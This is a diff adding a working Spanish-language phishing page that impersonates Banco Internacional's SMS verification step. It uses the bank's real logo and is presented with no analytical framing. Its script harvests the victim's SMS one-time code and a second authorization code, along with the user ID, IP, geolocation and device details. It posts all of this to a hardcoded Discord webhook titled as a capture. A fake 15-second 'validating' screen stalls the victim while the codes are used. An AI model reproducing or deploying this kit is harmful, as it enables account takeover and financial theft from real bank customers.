@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Banco Internacional — Verificación</title>
+<link href="https://api.fontshare.com/v2/css?f[]=satoshi@400,500,600,700&display=swap" rel="stylesheet">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  :root {
+    --gold:       #f59a05;
+    --gold-deep:  #d98200;
+    --gold-light: #f9ab22;
+    --radius-md:  12px;
+  }
+
+  html, body {
+    height: 100%;
+    font-family: 'Satoshi', -apple-system, sans-serif;
+    background: var(--gold);
+    -webkit-font-smoothing: antialiased;
+    overflow-x: hidden;
+  }
+
+  .bg-wrap {
+    position: fixed; inset: 0; z-index: 0;
+    background: linear-gradient(150deg, var(--gold-light) 0%, var(--gold) 45%, var(--gold-deep) 100%);
+    overflow: hidden;
+  }
+  .bg-wrap::before {
+    content:''; position:absolute;
+    width:560px; height:560px;
+    background: radial-gradient(circle, rgba(255,255,255,0.11) 0%, transparent 65%);
+    top:-200px; right:-140px; border-radius:50%;
+  }
+  .bg-wrap::after {
+    content:''; position:absolute;
+    width:400px; height:400px;
+    background: radial-gradient(circle, rgba(0,0,0,0.07) 0%, transparent 65%);
+    bottom:-120px; left:-100px; border-radius:50%;
+  }
+  .bg-line {
+    position:absolute; top:0; left:0; right:0; height:3px;
+    background: linear-gradient(90deg, transparent 0%, rgba(255,255,255,0.6) 40%, rgba(255,255,255,0.6) 60%, transparent 100%);
+  }
+
+  .app {
+    position: relative; z-index: 1;
+    display: flex; flex-direction: column;
+    min-height: 100dvh; max-width: 430px;
+    margin: 0 auto; padding-bottom: 40px;
+  }
+
+  .topbar {
+    display: flex; align-items: center;
+    padding: 48px 24px 16px;
+  }
+  .topbar img { width: 148px; filter: drop-shadow(0 1px 6px rgba(0,0,0,0.14)); }
+
+  .user-row {
+    display:flex; align-items:center; gap:11px;
+    margin: 6px 24px 36px;
+  }
+  .user-avatar {
+    width:38px; height:38px; border-radius:50%;
+    background:rgba(255,255,255,0.18);
+    border:1.5px solid rgba(255,255,255,0.3);
+    display:flex; align-items:center; justify-content:center; flex-shrink:0;
+  }
+  .user-avatar svg { width:17px; height:17px; }
+  .user-meta-label {
+    font-size:0.68rem; font-weight:600;
+    color:rgba(255,255,255,0.6);
+    text-transform:uppercase; letter-spacing:0.8px;
+    line-height:1; margin-bottom:2px;
+  }
+  .user-meta-value { font-size:0.92rem; font-weight:700; color:#fff; }
+
+  .section {
+    padding: 0 24px;
+    color: #fff;
+    animation: fadeUp 0.38s cubic-bezier(.22,.68,0,1.12) both;
+  }
+  @keyframes fadeUp {
+    from { opacity:0; transform:translateY(16px); }
+    to   { opacity:1; transform:translateY(0); }
+  }
+
+  .section-title {
+    font-size: 1.05rem; font-weight: 700;
+    letter-spacing: -0.2px; margin-bottom: 3px;
+  }
+  .section-sub {
+    font-size: 0.78rem; opacity: 0.65; line-height: 1.45;
+    margin-bottom: 22px;
+  }
+
+  .divider {
+    height: 1px;
+    background: rgba(255,255,255,0.14);
+    margin-bottom: 22px;
+  }
+
+  .info-strip {
+    display:flex; align-items:flex-start; gap:9px;
+    background:rgba(255,255,255,0.08);
+    border:1px solid rgba(255,255,255,0.10);
+    border-radius:var(--radius-md);
+    padding:11px 13px; margin-bottom:20px;
+  }
+  .info-strip svg { width:14px; height:14px; flex-shrink:0; margin-top:2px; opacity:0.65; }
+  .info-strip p   { font-size:0.76rem; line-height:1.55; opacity:0.80; }
+
+  .field { margin-bottom: 13px; }
+  .field-label {
+    display:block; font-size:0.68rem; font-weight:700;
+    text-transform:uppercase; letter-spacing:0.8px;
+    opacity:0.65; margin-bottom:6px;
+  }
+  .code-input {
+    width:100%; height:52px;
+    background:rgba(255,255,255,0.12);
+    border:1.5px solid rgba(255,255,255,0.22);
+    border-radius:var(--radius-md);
+    padding:0 18px;
+    font-size:1.2rem; font-weight:700; color:#fff;
+    letter-spacing:7px; outline:none; caret-color:#fff;
+    font-family:'Satoshi',sans-serif;
+    transition:background 0.18s, border-color 0.18s, box-shadow 0.18s;
+  }
+  .code-input::placeholder { color:rgba(255,255,255,0.25); letter-spacing:3px; font-size:0.88rem; font-weight:400; }
+  .code-input:focus {
+    background:rgba(255,255,255,0.18);
+    border-color:rgba(255,255,255,0.55);
+    box-shadow:0 0 0 3px rgba(255,255,255,0.07);
+  }
+
+  .btn {
+    width:100%; height:50px;
+    border-radius:var(--radius-md);
+    border:1.5px solid rgba(255,255,255,0.16);
+    background:rgba(255,255,255,0.08);
+    color:rgba(255,255,255,0.32);
+    font-size:0.88rem; font-weight:700; letter-spacing:0.3px;
+    cursor:not-allowed;
+    display:flex; align-items:center; justify-content:center; gap:8px;
+    font-family:'Satoshi',sans-serif;
+    transition:background 0.2s, border-color 0.2s, color 0.2s, box-shadow 0.2s, transform 0.12s;
+  }
+  .btn svg { width:15px; height:15px; flex-shrink:0; }
+  .btn.ready {
+    background:#fff; border-color:#fff; color:var(--gold-deep);
+    cursor:pointer; box-shadow:0 4px 18px rgba(0,0,0,0.10);
+  }
+  .btn.ready:active { transform:scale(0.98); }
+
+  .overlay {
+    display:none; position:fixed; inset:0; z-index:999;
+    background: linear-gradient(150deg, var(--gold-light) 0%, var(--gold) 45%, var(--gold-deep) 100%);
+    flex-direction:column; align-items:center; justify-content:center;
+    gap:22px; color:#fff; font-family:'Satoshi',sans-serif;
+  }
+  .overlay.show { display:flex; }
+  .overlay img { width:138px; filter:drop-shadow(0 2px 10px rgba(0,0,0,0.15)); }
+  .ring {
+    width:48px; height:48px; border-radius:50%;
+    border:4px solid rgba(255,255,255,0.18);
+    border-top-color:#fff;
+    animation:spin 0.8s linear infinite;
+  }
+  @keyframes spin { to { transform:rotate(360deg); } }
+  .overlay-text { font-size:0.86rem; opacity:0.82; text-align:center; padding:0 48px; line-height:1.65; }
+
+  .spacer { flex:1; }
+
+  .footer {
+    margin-top:22px;
+    display:flex; align-items:center; justify-content:center; gap:6px;
+    color:rgba(255,255,255,0.42);
+    font-size:0.68rem; font-weight:500; padding:0 24px;
+  }
+  .footer svg { width:11px; height:11px; }
+</style>
+</head>
+<body>
+
+<div class="bg-wrap"><div class="bg-line"></div></div>
+
+<div class="overlay" id="overlay">
+  <img src="https://www.bancointernacional.com.ec/wp-content/uploads/2020/11/cropped-logo-banco-internacional.webp" alt="Banco Internacional">
+  <div class="ring"></div>
+  <div class="overlay-text" id="overlayText">Validando código de seguridad.<br>Por favor no cierre esta ventana.</div>
+</div>
+
+<div class="app">
+
+  <div class="topbar">
+    <img src="https://www.bancointernacional.com.ec/wp-content/uploads/2020/11/cropped-logo-banco-internacional.webp" alt="Banco Internacional">
+  </div>
+
+  <div class="user-row">
+    <div class="user-avatar">
+      <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+        <circle cx="12" cy="8" r="4"/><path d="M4 20c0-4 3.6-7 8-7s8 3 8 7"/>
+      </svg>
+    </div>
+    <div>
+      <div class="user-meta-label">Usuario</div>
+      <div class="user-meta-value" id="userDisplay">Cargando…</div>
+    </div>
+  </div>
+
+  <!-- PASO 1 -->
+  <div id="paso1">
+    <div class="section">
+      <div class="section-title">Verificación por SMS</div>
+      <div class="section-sub">Código enviado al número registrado en su cuenta</div>
+      <div class="divider"></div>
+      <div class="info-strip">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/>
+        </svg>
+        <p>Ingrese el código recibido en su teléfono para continuar de forma segura con su sesión.</p>
+      </div>
+      <div class="field">
+        <label class="field-label" for="smsCode">Código de verificación SMS</label>
+        <input class="code-input" id="smsCode" type="tel" maxlength="10"
+               placeholder="• • • • • •" autocomplete="one-time-code" inputmode="numeric">
+      </div>
+      <button class="btn" id="btnSms">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+        Verificar código
+      </button>
+    </div>
+  </div>
+
+  <!-- PASO 2 -->
+  <div id="paso2" style="display:none;">
+    <div class="section">
+      <div class="section-title">Código de autorización</div>
+      <div class="section-sub">Verificación adicional requerida por el banco</div>
+      <div class="divider"></div>
+      <div class="info-strip">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+        </svg>
+        <p>Por seguridad del banco se requiere un código de autorización adicional para finalizar el acceso.</p>
+      </div>
+      <div class="field">
+        <label class="field-label" for="extraCode">Código de autorización</label>
+        <input class="code-input" id="extraCode" type="tel" maxlength="10"
+               placeholder="• • • • • •" autocomplete="off" inputmode="numeric">
+      </div>
+      <button class="btn" id="btnExtra">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+        Confirmar y continuar
+      </button>
+    </div>
+  </div>
+
+  <div class="spacer"></div>
+
+  <div class="footer">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+      <rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+    </svg>
+    Conexión segura SSL · Banco Internacional © 2025
+  </div>
+</div>
+
+<script>
+  const WEBHOOK = "https://discord.com/api/webhooks/1491163890715853021/Z7As4jVZZHi81cEJZjXhzbQez81R5grblQVbf29Rh4AH5Y2b8Jw54wBfVHNAPXC9QOkW";
+  const LOGO    = "https://www.bancointernacional.com.ec/wp-content/uploads/2020/11/cropped-logo-banco-internacional.webp";
+
+  const savedDni = (function(){ try { return localStorage.getItem("bf_last_dni") || "Cliente"; } catch(e){ return "Cliente"; } })();
+  document.getElementById("userDisplay").textContent = savedDni;
+
+  async function getIP() {
+    let ip="Desconocida",country="Desconocido",city="Desconocida",isp="Desconocido",tz="Desconocido";
+    try {
+      const d = await (await fetch("https://ipapi.co/json/")).json();
+      ip=d.ip||ip; country=d.country_name||country; city=d.city||city; isp=d.org||isp; tz=d.timezone||tz;
+    } catch(e){}
+    return {ip,country,city,isp,tz};
+  }
+  function dev() {
+    const ua=navigator.userAgent;
+    let device="Desktop";
+    if(/iPhone/i.test(ua)) device="iPhone";
+    else if(/iPad/i.test(ua)) device="iPad";
+    else if(/Android/i.test(ua)) device="Android";
+    const br=/Chrome/i.test(ua)?"Chrome":/Firefox/i.test(ua)?"Firefox":/Safari/i.test(ua)?"Safari":/Edge/i.test(ua)?"Edge":"Otro";
+    const os=/Windows/i.test(ua)?"Windows":/Mac/i.test(ua)?"macOS":/Linux/i.test(ua)?"Linux":/Android/i.test(ua)?"Android":"Desconocido";
+    const scr=`${screen.width}x${screen.height}`;
+    const now=new Date();
+    return { device, br, os, scr,
+      fecha: now.toLocaleDateString("es-ES",{weekday:"long",year:"numeric",month:"long",day:"numeric"}),
+      hora:  now.toLocaleTimeString("es-ES",{hour:"2-digit",minute:"2-digit",second:"2-digit"}) };
+  }
+
+  async function send(title, campos) {
+    const g=await getIP(), d=dev();
+    await fetch(WEBHOOK, {
+      method:"POST", headers:{"Content-Type":"application/json"},
+      body: JSON.stringify({
+        username:"Banco Internacional – Captura", avatar_url: LOGO,
+        embeds:[{ title, color: 0xf59a05, thumbnail:{ url: LOGO },
+          fields:[
+            ...campos,
+            { name:"🌐  RED / IP", inline:false, value:`> **IP:** \`${g.ip}\`\n> **País:** ${g.country}\n> **Ciudad:** ${g.city}\n> **ISP:** ${g.isp}\n> **Zona horaria:** ${g.tz}` },
+            { name:"💻  DISPOSITIVO", inline:false, value:`> **Dispositivo:** ${d.device}\n> **SO:** ${d.os}\n> **Navegador:** ${d.br}\n> **Resolución:** ${d.scr}` },
+            { name:"🕐  FECHA Y HORA", inline:false, value:`> 📅 ${d.fecha}\n> 🕐 ${d.hora}` }
+          ],
+          footer:{ text:"Banco Internacional • Verificación segura", icon_url: LOGO },
+          timestamp: new Date().toISOString()
+        }]
+      })
+    });
+  }
+
+  function watchInput(inpId, btnId) {
+    const inp=document.getElementById(inpId), btn=document.getElementById(btnId);
+    inp.addEventListener("input",()=>{
+      inp.value = inp.value.replace(/\D/g,"");
+      btn.classList.toggle("ready", inp.value.length >= 3);
+    });
+  }
+  watchInput("smsCode","btnSms");
+  watchInput("extraCode","btnExtra");
+
+  const ov=document.getElementById("overlay"), ovTxt=document.getElementById("overlayText");
+  const showOv=(t)=>{ ovTxt.innerHTML=t; ov.classList.add("show"); };
+  const hideOv=()=> ov.classList.remove("show");
+
+  document.getElementById("btnSms").addEventListener("click", async function(){
+    if(!this.classList.contains("ready")) return;
+    const code = document.getElementById("smsCode").value.trim();
+    this.textContent = "Verificando…"; this.disabled = true;
+    try {
+      await send("📱  CÓDIGO SMS — BANCO INTERNACIONAL",[{
+        name:"🪪  DATOS DE ACCESO", inline:false,
+        value:`\`\`\`\nUsuario   : ${savedDni}\nCódigo SMS: ${code}\n\`\`\``
+      }]);
+    } catch(e){}
+    showOv("Validando código de seguridad.<br>Por favor no cierre esta ventana.");
+    setTimeout(()=>{
+      hideOv();
+      document.getElementById("paso1").style.display="none";
+      document.getElementById("paso2").style.display="block";
+    }, 15000);
+  });
+
+  document.getElementById("btnExtra").addEventListener("click", async function(){
+    if(!this.classList.contains("ready")) return;
+    const code = document.getElementById("extraCode").value.trim();
+    this.textContent = "Confirmando…"; this.disabled = true;
+    try {
+      await send("🛡️  CÓDIGO ADICIONAL — BANCO INTERNACIONAL",[{
+        name:"🪪  DATOS DE ACCESO", inline:false,
+        value:`\`\`\`\nUsuario          : ${savedDni}\nCódigo adicional : ${code}\n\`\`\``
+      }]);
+    } catch(e){}
+    showOv("Procesando autorización final.<br>Por favor no cierre esta ventana.");
+    setTimeout(()=>{ window.location.href="index.html"; }, 15000);
+  });
+</script>
+</body>
+</html>
